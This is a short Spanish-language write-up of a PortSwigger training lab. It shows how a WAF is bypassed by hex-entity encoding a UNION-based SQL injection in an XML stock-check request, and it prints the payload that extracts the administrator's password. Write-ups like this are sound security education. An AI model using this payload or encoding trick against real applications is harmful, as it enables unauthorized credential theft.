---
title: SQL injection with filter bypass via XML encoding - portswigger
date: 2024-08-04
categories: [Write up, portswigger]
tags: [sql injection]      # TAG names should always be lowercase
---

En este laboratorio usaremos la extencion de `Hackvertor` para bypassear el waf

![20240805131528.png](20240805131528.png)

Instalamos la extensión.

![20240805132602.png](20240805132602.png)

Luego encodeamos el parámetro vulnerable.

![20240805132720.png](20240805132720.png)

Luego de en codear debemos de tener de la siguiente manera:

```c
<?xml version="1.0" encoding="UTF-8"?>
	<stockCheck>
		<productId>
		<@hex_entities>
		3  union select password from users where username='administrator'-- - 
		<@/hex_entities>
		</productId>
	<storeId>1</storeId>
</stockCheck>

```

Ahora enviamos y obtendremos la contraseña del usuario administrator:

![20240805132846.png](20240805132846.png)

